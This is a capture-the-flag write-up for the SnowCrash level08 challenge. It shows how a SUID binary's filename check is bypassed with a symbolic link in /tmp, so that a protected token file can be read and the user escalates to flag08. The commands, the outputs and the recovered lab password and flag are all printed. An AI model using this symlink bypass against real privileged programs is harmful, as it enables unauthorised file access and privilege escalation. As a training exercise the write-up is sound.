1. **File Search**

    ```bash
    level08@SnowCrash:~$ ll
    [...]
    -rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08*
    -rw-------  1 flag08  flag08    26 Mar  5  2016 token

    level08@SnowCrash:~$ ./level08 
    ./level08 [file to read]

    level08@SnowCrash:~$ ./level08  token
    You may not access 'token'
    ```

2. **Analysis and Exploitation**

    When listing the files, we observe the following:
    *   The binary `level08` has permissions `rwsr-s---+`. The SUID bit (`s` in the user permissions) means that the program runs with the permissions of the file owner, which is `flag08`.
    *   The `token` file is owned by `flag08` and only `flag08` can read it (`-rw-------`).
    *   The `level08` program takes a file name as an argument and displays its content.
    *   If we try to read the `token` file directly (`./level08 token`), the program displays the message "You may not access 'token'". This indicates a simple protection based on the file name.

    The vulnerability here is that the file name check for "token" can be bypassed. Since the program runs as `flag08`, it has permission to read the `token` file. If we provide a different file name that points to `token` (for example, a symbolic link), the name check will fail, but the program will still be able to read the file due to its SUID privileges.

3. **Exploitation Steps**

    We create a symbolic link to the `token` file and then use `level08` to read the content through this link:
    ```bash
    level08@SnowCrash:~$ ln -s ~/token /tmp/file
    level08@SnowCrash:~$ ll /tmp/file
    lrwxrwxrwx 1 level08 level08 24 May  7 15:35 /tmp/file -> /home/user/level08/token
    level08@SnowCrash:~$ ./level08 /tmp/file
    quif5eloekouj29ke0vouxean  # Password flag08
    level08@SnowCrash:~$ su flag08
    Password: 
    Do not forget to launch getflag !
    flag08@SnowCrash:~$ getflag
    Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
    ```
    This works because the `level08` program checks if the argument is the string "token". By passing "/tmp/file", the check is bypassed. Then, when the program tries to open and read the file, the operating system resolves the symbolic link to `token`, and since `level08` runs with `flag08`'s privileges, it can read it successfully.
